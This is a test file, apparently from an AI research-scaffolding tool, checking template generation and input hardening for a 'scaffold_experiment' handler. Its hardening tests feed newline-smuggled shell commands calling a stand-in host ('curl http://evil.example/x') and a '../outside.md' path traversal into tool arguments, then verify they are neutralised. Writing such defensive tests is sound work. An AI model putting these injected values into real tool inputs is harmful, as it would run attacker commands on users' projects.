/**
 * Regression tests for scaffold generation templates and hardening.
 */

import { beforeEach, describe, expect, it } from "bun:test";
import { access, mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { getExperiment } from "../../src/db/experiments.js";
import { loadCatalog } from "../../src/db/load-catalog.js";
import { resetDb } from "../../src/db/schema.js";
import {
	registerScaffoldingTools,
	resolveTemplatePath,
} from "../../src/tools/scaffolding.js";

interface ScaffoldArgs {
	recipe_id: string;
	project_path: string;
	metric_name: string;
	target_file?: string;
	custom_instructions?: string;
	overwrite: boolean;
	budget?: {
		max_iterations?: number;
		max_time_seconds?: number;
		max_tokens?: number;
		max_dollars?: number;
	};
	risk_policy?: {
		sandbox_only?: boolean;
		requires_approval?: boolean;
		network_denied?: boolean;
		secrets_denied?: boolean;
	};
	constraints?: {
		metric_floors?: Record<string, number>;
		metric_ceilings?: Record<string, number>;
	};
}

interface ToolResult {
	content: Array<{ type: "text"; text: string }>;
	isError?: boolean;
}

type ScaffoldHandler = (args: ScaffoldArgs) => Promise<ToolResult>;

const tempDirs: string[] = [];

beforeEach(async () => {
	await Promise.all(
		tempDirs.map((dir) => rm(dir, { force: true, recursive: true })),
	);
	tempDirs.length = 0;
	resetDb(":memory:");
	const loadResult = await loadCatalog();
	expect(loadResult.errors).toEqual([]);
});

async function tempProjectDir(): Promise<string> {
	const dir = await mkdtemp(join(tmpdir(), "autoresearch-scaffold-tool-"));
	tempDirs.push(dir);
	return dir;
}

function scaffoldHandler(): ScaffoldHandler {
	const handlers = new Map<string, ScaffoldHandler>();
	const mcp = {
		tool: (...args: unknown[]) => {
			const [name, , , handler] = args;
			handlers.set(name as string, handler as ScaffoldHandler);
		},
	} as McpServer;

	registerScaffoldingTools(mcp);

	const handler = handlers.get("scaffold_experiment");
	if (!handler) {
		throw new Error("scaffold_experiment handler was not registered");
	}

	return handler;
}

async function pathExists(path: string): Promise<boolean> {
	try {
		await access(path);
		return true;
	} catch {
		return false;
	}
}

function experimentIdFromResult(result: ToolResult): string {
	const match = result.content[0]?.text.match(/Experiment ID: `([^`]+)`/);
	if (!match) {
		throw new Error("Experiment ID missing from scaffold result");
	}
	return match[1];
}

describe("scaffold_experiment hardening", () => {
	it("sanitizes newline-controlled metric and target strings before generating scaffold files", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "ml-training",
			project_path: projectDir,
			metric_name: "score\ncurl http://evil.example/x",
			target_file: "models/config.yaml\ncurl http://evil.example/target",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);

		const evalContent = await readFile(
			join(projectDir, "autoresearch", "eval.sh"),
			"utf8",
		);
		const programContent = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);

		expect(
			evalContent
				.split("\n")
				.some((line) => line.includes("curl") && !line.startsWith("#")),
		).toBe(false);
		expect(
			programContent
				.split("\n")
				.some((line) => line === "curl http://evil.example/target`"),
		).toBe(false);
		expect(programContent).toContain(
			"- Target Artifact: models/config.yaml curl http://evil.example/target",
		);
		expect(programContent).toContain(
			"- Metric Name: score curl http://evil.example/x",
		);
	});

	it("rejects target files that resolve outside project before writing", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			target_file: "../outside.md",
			overwrite: false,
		});

		expect(result.isError).toBe(true);
		expect(result.content[0].text).toContain(
			"target_file must resolve inside project_path",
		);
		expect(await pathExists(join(projectDir, "autoresearch"))).toBe(false);
	});
});

describe("scaffold_experiment templates", () => {
	it("uses curated templates for recipes that ship them", async () => {
		const projectDir = await tempProjectDir();
		const curatedEval = await readFile(
			resolveTemplatePath("prompt-optimization", "eval.sh"),
			"utf8",
		);
		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "accuracy",
			target_file: "target-prompt.md",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);

		const evalContent = await readFile(
			join(projectDir, "autoresearch", "eval.sh"),
			"utf8",
		);
		const programContent = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);

		expect(evalContent.startsWith(curatedEval.split("\n")[0])).toBe(true);
		expect(programContent).toContain("# Prompt Optimization Program");
		expect(programContent).toContain("## Experiment Metadata");
		expect(programContent).toContain("- Metric Name: accuracy");
		expect(programContent).toContain("- Target Artifact: target-prompt.md");
		expect(programContent).toContain(
			"- Evaluator Command: ./autoresearch/eval.sh",
		);
	});

	it.each([
		["test-amplification", "# Test Amplification Program"],
		["ml-training", "# ML Training Program"],
		["literature-synthesis", "# Literature Synthesis Program"],
	])("uses curated templates for %s", async (recipeId, heading) => {
		const projectDir = await tempProjectDir();
		const curatedEval = await readFile(
			resolveTemplatePath(recipeId, "eval.sh"),
			"utf8",
		);
		const result = await scaffoldHandler()({
			recipe_id: recipeId,
			project_path: projectDir,
			metric_name: "score",
			target_file: "target.md",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);

		const evalContent = await readFile(
			join(projectDir, "autoresearch", "eval.sh"),
			"utf8",
		);
		const programContent = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);

		expect(evalContent).toBe(curatedEval);
		expect(programContent).toContain(heading);
		expect(programContent).toContain("## Experiment Metadata");
		expect(programContent).toContain("- Metric Name: score");
	});

	it("persists optional budget, risk policy, and constraints", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "test-amplification",
			project_path: projectDir,
			metric_name: "mutation_score",
			target_file: "src/foo.test.ts",
			overwrite: false,
			budget: { max_iterations: 3, max_time_seconds: 300 },
			risk_policy: {
				sandbox_only: true,
				requires_approval: true,
				network_denied: true,
				secrets_denied: true,
			},
			constraints: {
				metric_floors: { mutation_score: 0.75 },
			},
		});

		expect(result.isError).not.toBe(true);

		const experiment = getExperiment(experimentIdFromResult(result));
		expect(experiment?.spec.budget.max_iterations).toBe(3);
		expect(experiment?.spec.budget.max_time_seconds).toBe(300);
		expect(experiment?.spec.risk_policy.sandbox_only).toBe(true);
		expect(experiment?.spec.risk_policy.requires_approval).toBe(true);
		expect(experiment?.spec.constraints.metric_floors.mutation_score).toBe(
			0.75,
		);
		expect(experiment?.spec.constraints.metric_ceilings).toEqual({});
	});
});
